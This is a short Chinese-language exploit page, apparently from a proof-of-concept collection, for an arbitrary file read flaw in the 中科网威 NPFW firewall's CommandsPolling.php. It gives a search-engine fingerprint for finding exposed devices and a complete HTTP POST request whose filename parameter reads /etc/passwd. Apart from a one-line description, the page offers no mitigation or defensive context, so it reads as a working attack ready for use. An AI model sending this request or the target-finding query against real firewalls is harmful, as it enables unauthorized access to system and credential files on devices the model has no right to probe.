# 中科网威 NPFW防火墙 CommandsPolling.php 任意文件读取漏洞

## 漏洞描述

中科网威 NPFW防火墙 存在任意文件读取漏洞，由于代码过滤不足，可读取服务器任意文件

## 漏洞影响

```
中科网威 NPFW防火墙 
```

## 网络测绘

```
"中科网威" && "/direct"
```

## 漏洞复现

登录页面

![img](images/202202101852340.png)

发送请求包

```php
POST /direct/polling/CommandsPolling.php HTTP/1.1
Host: 
Cookie: PHPSESSID=014d2705856e1df139772db42ccbaf9f
Content-Length: 47
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
```

![img](images/202202101852498.png)